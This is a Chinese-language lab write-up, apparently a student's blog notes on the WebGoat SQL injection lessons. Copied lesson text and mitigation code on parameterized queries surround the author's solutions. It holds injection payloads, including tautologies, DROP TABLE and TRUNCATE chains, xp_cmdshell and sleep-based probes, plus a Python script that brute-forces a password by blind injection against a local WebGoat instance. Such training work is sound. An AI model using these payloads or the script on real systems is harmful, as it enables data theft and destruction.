---
title: 'WebGoat实战: Injection'
tags: WebGoat
categories:
 - 想要毕业
 - 网络对抗原理
description: 网络对抗原理实验（一）
abbrlink: f6ab3c74
date: 2021-06-01 12:52:46
cover:
katex:
---

## SQL Injection (intro)

### What is SQL?

SQL is a standardized (ANSI in 1986, ISO in 1987) programming language which is used for managing relational databases and performing various operations on the data in them.

A database is a collection of data. Data is organized into rows, columns and tables, and it is indexed to make it easier to find relevant information.

Example SQL table with employees, the name of the table is 'employees':

Employees Table

| userid | first_name | last_name | department  | salary  | auth_tan |
| ------ | ---------- | --------- | ----------- | ------- | -------- |
| 32147  | Paulina    | Travers   | Accounting  | $46.000 | P45JSI   |
| 89762  | Tobi       | Barnett   | Development | $77.000 | TA9LL1   |
| 96134  | Bob        | Franco    | Marketing   | $83.700 | LO9S2V   |
| 34477  | Abraham    | Holman    | Development | $50.000 | UU2ALK   |
| 37648  | John       | Smith     | Marketing   | $64.350 | 3SL99A   |

A company saves the following information of an employee in their databases: a unique employee number, the lastnname, the firstname, the department of the employee, the salary and an auth_tan.

One row represents one employee of the company.

By using SQL queries you can modify a database table and its index structures, add, update and delete rows of data.

There are three types of SQL commands in the SQL database language: Each type of command carries the danger of violating different protection goals if an intruder attacks your database system.

The 3 main protection goals in information security are confidentiality, integrity, and availability are considered the three most crucial components of information security. Go ahead to the next pages to get some details on the different types of commands and protections goals.

If you are still struggling with SQL and need more information or practice you can visit http://www.sqlcourse.com/ for an interactive and free online training.

<img src="https://img.foopi.top/postpic/image-20210531103338670.webp" alt="image-20210531103338670" style="zoom:50%;" />

#### Data Manipulation Language (DML)

As the name says data manipulation language deals with the manipulation of data and includes the most common SQL statements such as SELECT, INSERT, UPDATE, DELETE, etc., and it is used for requesting a result set of records from database tables (select), adding (insert), deleting and modifying (update) data in a database.

If an attacker uses SQL injection of the DML type to manipulate your database, he will violate the following of the three protection goals in information security: confidentiality (…) & integrity (update) (Only people authorized to read the data can do so).

- DML commands are used for storing, retrieving, modifying, and deleting data.
- SELECT - retrieve data from a database
- INSERT - insert data into a table
- UPDATE - updates existing data within a table
- DELETE - Delete all records from a database table

<img src="https://img.foopi.top/postpic/image-20210531105719757.webp" alt="image-20210531105719757" style="zoom:50%;" />

#### Data Definition Language (DDL)

Data definition language includes commands for defining data structures, especially database schemas which tell how the data should reside in the database.

If an attacker uses SQL injection of the DDL type to manipulate your database, he will violate the following of the three protection goals in information security: integrity (alter) & availability (drop). (Only people authorized to change/delete the data can do so.)

- DDL commands are used for creating, modifying, and dropping the structure of database objects.
- CREATE - to create a database and its objects like (table, views, …)
- ALTER - alters the structure of the existing database
- DROP - delete objects from the database
- Example:
  - CREATE TABLE employees(
      userid varchar(6) not null primary key,
      first_name varchar(20),
      last_name varchar(20),
      department varchar(20),
      salary varchar(10),
      auth_tan varchar(6)
    );

<img src="https://img.foopi.top/postpic/image-20210531110214472.webp" alt="image-20210531110214472" style="zoom:50%;" />

#### Data Control Language (DCL)

Data control language is used to create privileges to allow users to access and manipulate the database.

If an attacker uses SQL injection of the DCL type to manipulate your database, he will violate the following of the three protection goals in information security: confidentiality (grant) & availability (revoke) (Unwanted people could grand themselves admin privileges or revoke the admin rights from an administrator)

- DCL commands are used for providing security to database objects.
- GRANT - allow users access privileges to the database
- REVOKE - withdraw users access privileges given by using the GRANT command

<img src="https://img.foopi.top/postpic/image-20210531110714160.webp" alt="image-20210531110714160" style="zoom:50%;" />

### What is SQL injection?

SQL injections are the most common web hacking techniques. **A SQL injection attack consists of insertion or "injection" of malicious code via the SQL query input from the client to the application.** If not dealt with correctly, such an injection of code into the application can have an serious impact on e.g. data integrity and security.

SQL injections can occur, when unfiltered data from the client, e.g. the input of a search field, gets into the SQL interpreter of the application itself. If the input from the client does not get checked for containing SQL commands, hackers can easily manipulate the underlying SQL statement to their advantage.

```
"SELECT * FROM users WHERE name = '" + userName + "'";
```

Here are some examples of what a hacker could supply to the input field to perform actions on the database that go further than just reading the data of a single user:

- `Smith’ OR '1' = '1`
  results in `SELECT * FROM users WHERE name = 'Smith' OR TRUE;` and that way will return all entries from the users table
- `Smith’ OR 1 = 1; --`
  results in `SELECT * FROM users WHERE name = 'Smith' OR TRUE;--';` and that way will return all entries from the users table
- `Smith’; DROP TABLE users; TRUNCATE audit_log; --`
  chains multiple SQL-Commands and deletes the USERS table as well as entries from the audit_log

### Consequences of SQL injection

A successful SQL injection exploit can:

- Read and modify sensitive data from the database
- Execute administration operations on the database
  - Shutdown auditing or the DBMS
  - Truncate tables and logs
  - Add users
- Recover the content of a given file present on the DBMS file system
- Issue commands to the operating system

SQL injection attacks allow attackers to

- Spoof identity
- Tamper with existing data
- Cause repudiation issues such as voiding transactions or changing balances
- Allow the complete disclosure of all data on the system
- Destroy the data or make it otherwise unavailable
- Become administrator of the database server

### Severity of SQL injection

The severity of SQL injection attacks is limited by

- Attacker’s skill and imagination
- Defense in depth countermeasures
  - Input validation
  - Least privilege
- Database technology

Not all databases support command chaining

- Microsoft Access
- MySQL Connector/J and C
- Oracle

SQL injection is more common in PHP, Classic ASP, Cold Fusion and older languages

- Languages that do not provide parameterized query support
- Parameterized queries have been added to newer versions
- Early adopters of web technology (i.e. Old Code)

Not all databases are equal (SQL Server)

- Command shell: `master.dbo.xp_cmdshell 'cmd.exe dir c:'`
- Registry commands: `xp_regread`, `xp_regdeletekey`, …

<img src="https://img.foopi.top/postpic/image-20210531113400990.webp" alt="image-20210531113400990" style="zoom:50%;" />

<img src="https://img.foopi.top/postpic/image-20210531114008241.webp" alt="image-20210531114008241" style="zoom:50%;" />

<img src="https://img.foopi.top/postpic/image-20210531115227436.webp" alt="image-20210531115227436" style="zoom:50%;" />

<img src="https://img.foopi.top/postpic/image-20210531115758586.webp" alt="image-20210531115758586" style="zoom:50%;" />

<img src="https://img.foopi.top/postpic/image-20210531131408420.webp" alt="image-20210531131408420" style="zoom:50%;" />

`update';drop table access_log` 讲道理这突然绿了我是没想到的。没想到吧？应该还有个引号没处理。

<img src="https://img.foopi.top/postpic/image-20210531120841567.webp" alt="image-20210531120841567" style="zoom:50%;" />

## SQL Injection (advanced)

### Special Characters

```
/* */ 	 are inline comments
-- , # 	 are line comments

Example: SELECT * FROM users WHERE name = 'admin' --AND pass = 'pass'
;    allows query chaining

Example: SELECT * FROM users; DROP TABLE users;
',+,||	 allows string concatenation
Char()	 strings without quotes

Example: SELECT * FROM users WHERE name = '+char(27) OR 1=1
```

### Special Statements

#### Union

The Union operator is used, to combine the results of two or more SELECT Statements.

Rules to keep in mind, when working with a UNION:

- The number of columns selected in each statement must be the same.
- The datatype of the first column in the first SELECT statement, must match the datatype of the first column in the second (third, fourth, …) SELECT Statement. The Same applies to all other columns.

```
SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;
```

The UNION ALL Syntax also allows duplicate Values.

#### Joins

The Join operator is used to combine rows from two ore more tables, based on a related column

```
SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
```

<img src="https://img.foopi.top/postpic/image-20210601113124241.webp" alt="image-20210601113124241" style="zoom:50%;" />

### Blind SQL injection 盲注

Blind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

#### Difference

Let us first start with the difference between a normal SQL injection and a blind SQL injection. In a normal SQL injection the error messages from the database are displayed and gives enough information to find out how the query is working. Or in the case of an UNION based SQL injection the application does not reflect the information directly on the web page. So in the case where nothing is displayed you will need to start asking the database questions based on a true or false statement. That is why a blind SQL injection is much more difficult to exploit.

There are several different types of blind SQL injections: **content-based** and **time-based** SQL injections.

#### Example

In this case we are trying to ask the database a boolean question based on for example an unique id, for example suppose we have the following url: `https://my-shop.com?article=4` On the server side this query will be translated as follows:

```
SELECT * FROM articles WHERE article_id = 4
```

When we want to exploit this we change the url into: `https://shop.example.com?article=4 AND 1=1` This will be translated to:

```
SELECT * FROM articles WHERE article_id = 4 and 1 = 1
```

If the browser will return the same page as it used to when using `https://shop.example.com?article=4` you know the website is vulnerable for a blind SQL injection. If the browser responds with a page not found or something else you know a blind SQL injection might not work. You can now change the SQL query and test for example: `https://shop.example.com?article=4 AND 1=2` which will not return anything because the query returns false.

So but how do we actually take advantage of this? Above we only asked the database for trivial question but you can for example also use the following url: `https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2`

Most of the time you start by finding which type of database is used, based on the type of database you can find the system tables of the database you can enumerate all the tables present in the database. With this information you can start getting information from all the tables and you are able to dump the database. Be aware that this approach might not work if the privileges of the database are setup correctly (meaning the system tables cannot be queried with the user used to connect from the web application to the database).

Another way is called a time-based SQL injection, in this case you will ask the database to wait before returning the result. You might need to use this if you are totally blind so there is no difference between the response you can use for example:

```
article = 4; sleep(10) --
```

<img src="https://img.foopi.top/postpic/image-20210601132454728.webp" alt="image-20210601132454728" style="zoom:50%;" />

这道题的暗坑是最后需要用`tom`登陆而不是`Tom`，首字母大写的用户名`Tom`甚至能直接注册。

两份参考思路：

利用BurpSuite：[WebGoat之路-2-Injection](https://www.richar.top/2020/10/03/WebGoat-2-Injection/)

使用python脚本：[历史最全 WebGoat 8.0 通关攻略](https://www.freebuf.com/column/221947.html)

<img src="https://img.foopi.top/postpic/image-20210601132705529.webp" alt="image-20210601132705529" style="zoom:50%;" />

猜测用户密码存储在`password`字段，`tom' or password='123`没有返回错误 :D

第一次使用`burpsuite`，随便找了份文档[BurpSuite系列(五)----Intruder模块(暴力破解)](https://blog.csdn.net/u011781521/article/details/54772795)

当猜测密码长度与实际密码长度相同时，注册失败，返回提示`"User {0} already exists please try to register with a different username."`因此进行如下尝试：

<img src="https://img.foopi.top/postpic/image-20210601151043797.webp" alt="image-20210601151043797" style="zoom:50%;" />

<img src="https://img.foopi.top/postpic/image-20210601151138749.webp" alt="image-20210601151138749" style="zoom:50%;" />

卑微社区版用户只能手动打标记or2

<img src="https://img.foopi.top/postpic/image-20210601152140183.webp" alt="image-20210601152140183" style="zoom:50%;" />

`start attack`后，可知密码长度为23：

<img src="https://img.foopi.top/postpic/image-20210601152252553.webp" alt="image-20210601152252553" style="zoom:50%;" />

burpsuite社区版爆破实在太慢了，朋友说能改线程数，我没能找到，大概是被阉割了。参考了原本放弃的python脚本版解法，发现并不难理解，稍作修改，跑出密码`thisisasecretfortomonly`。

最后多的两个符号有点奇怪？

<img src="https://img.foopi.top/postpic/image-20210601163435366.webp" alt="image-20210601163435366" style="zoom:50%;" />

```python
import requests
import string
chars = string.printable

vul_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"

headers = {
  'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
  'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
  'JSESSIONID': 'omFlKtq6XQFLTN2E3uHjKkZ2i_JZB8edIVKLm57s',
}

i = 0
result = ""
while True:
  i += 1
  tmp = result
  for char in chars:
    data = "username_reg=tom' and substr(password,{0},1)='{1}' --&email_reg=tom%40webgoat.dev&password_reg=123&confirm_password_reg=123".format(i, char)
    resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies)
    #print(resp.text)
    if 'already exists' in resp.text:
      result += char
      print(result)
  if tmp == result:
    break
```

## SQL Injection (mitigation)

### Immutable Queries

These are the best defense against SQL injection.  They either do not have data that could get interpreted or they treat the data as a single entity that is bound to a column without interpretation.

#### Static Queries

```
SELECT * FROM products;
SELECT * FROM users WHERE user = "'" + session.getAttribute("UserID") + "'";
```

#### Parameterized Queries

```
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
```

##### Parameterized Queries - Java Snippet

```
public static bool isUsernameValid(string username) {
    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
    return r.isMatch(username);
}

// java.sql.Connection conn is set elsewhere for brevity.
PreparedStatement ps = null;
RecordSet rs = null;
try {
    pUserName = request.getParameter("UserName");
    if ( isUsernameValid (pUsername) ) {
        ps = conn.prepareStatement("SELECT * FROM user_table
                                   WHERE username = ? ");
        ps.setString(1, pUsername);
        rs = ps.execute();
        if ( rs.next() ) {
            // do the work of making the user record active in some way
        }
    } else { // handle invalid input }
}
catch (...) { // handle all exceptions ... }
```

##### Parameterized Queries - Java Example

```
public static String loadAccount() {
  // Parser returns only valid string data
  String accountID = getParser().getStringParameter(ACCT_ID, "");
  String data = null;
  String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
  try (Connection connection = null;
       PreparedStatement statement = connection.prepareStatement(query)) {
     statement.setString(1, accountID);
     ResultSet results = statement.executeQuery();
     if (results != null && results.first()) {
       results.last(); // Only one record should be returned for this query
       if (results.getRow() <= 2) {
         data = processAccount(results);
       } else {
         // Handle the error - Database integrity issue
       }
     } else {
       // Handle the error - no records found }
     }
  } catch (SQLException sqle) {
    // Log and handle the SQL Exception }
  }
  return data;
}
```

##### Parameterized Queries - .NET

```
public static bool isUsernameValid(string username) {
	RegEx r = new Regex("^[A-Za-z0-9]{16}$");
	Return r.isMatch(username);
}

// SqlConnection conn is set and opened elsewhere for brevity.
try {
	string selectString = "SELECT * FROM user_table WHERE username = @userID";
	SqlCommand cmd = new SqlCommand( selectString, conn );
	if ( isUsernameValid( uid ) ) {
		cmd.Parameters.Add( "@userID", SqlDbType.VarChar, 16 ).Value = uid;
		SqlDataReader myReader = cmd.ExecuteReader();
		if ( myReader ) {
			// make the user record active in some way.
			myReader.Close();
		}
	} else { // handle invalid input }
}
catch (Exception e) { // Handle all exceptions... }
```

#### Stored Procedures

Only if stored procedure does not generate dynamic SQL

##### Safe Stored Procedure (Microsoft SQL Server)

```
CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
AS
SELECT city, COUNT(*)
FROM customers
WHERE country LIKE @Country GROUP BY city

EXEC ListCustomers ‘USA’
```

##### Injectable Stored Procedure (Microsoft SQL Server)

```
CREATE PROEDURE getUser(@lastName nvarchar(25))
AS
declare @sql nvarchar(255)
set @sql = 'SELECT * FROM users WHERE
            lastname = + @LastName + '
exec sp_executesql @sql
```

有一个比较头疼的问题，我当初java学得一般，目前已经忘得差不多了，看看代码尚可，写就。。。建议参考之前的两篇文章or2

啊他们写得真好啊.jpg

我的webgoat系列只是复制粘贴lesson内容罢了，只为了以后想看时不用打开虚拟机docker，可是又有什么意义呢？像极了浪费时间。

还有二十天期末考试，有些焦虑。sql注入部分结束后先准备考试吧w
